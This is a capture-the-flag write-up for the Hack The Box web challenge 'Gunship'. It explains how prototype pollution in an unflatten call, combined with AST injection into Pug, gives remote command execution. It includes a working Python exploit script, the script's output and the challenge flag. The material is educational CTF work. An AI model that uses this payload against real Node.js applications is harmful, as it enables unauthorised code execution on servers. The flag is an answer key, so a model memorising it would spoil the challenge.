# Gunship

## Overview

* Difficulty: Very Easy
* Category: Web

## Description
> A city of lights, with retrofuturistic 80s peoples, and coffee, and drinks from another world... all the wooing in the world to make you feel more lonely... this ride ends here, with a tribute page of the British synthwave band called Gunship. 🎶

## Approach

1. Looking through the code of routes/index.js, we can see that the unflatten function is used without filtering the given JSON data. We can abuse this to pollute the data with a command execution (check [this link](https://blog.p6.is/AST-Injection/) to see how this works)

__ATTENTION__: the blog article made by po6ix contains both an explanation with Handlebars and with Pug. In this case, we're going to work with exploiting Pug, but in an older version of this challenge Handlebars was used.

2. We can write a python script that exploits the unflattening with an AST injection, running our injected command and storing it's output on a file that we can easily get with an HTTP request:

```py
import requests

url = 'http://138.68.155.238:31391'

cmd = 'ls > /app/static/out.txt'

# make pollution
r = requests.post(url+'/api/submit', json = {
        "artist.name":"Gingell",
        "__proto__.block": {
            "type": "Text",
            "line":"process.mainModule.require('child_process').execSync(`"+cmd+"`).toString()"
        }
    })

print("COMMAND INJECTED\n"+"_"*30)
print(cmd+"\n")
print("OUTPUT\n"+"_"*30)
print(requests.get(url+'/static/out.txt').text)
```

As we can see from the following output, the injection worked:

```bash
COMMAND INJECTED
______________________________
ls > /app/static/out.txt

OUTPUT
______________________________
flagQ7gI0
index.js
node_modules
package.json
routes
static
views
yarn.lock
```

3. Now we have to just use `cat flag* > /app/static/out.txt` as our injected command to read the flag

## Flag

<details>
<summary>Click to view the flag</summary>

__HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}__

</details>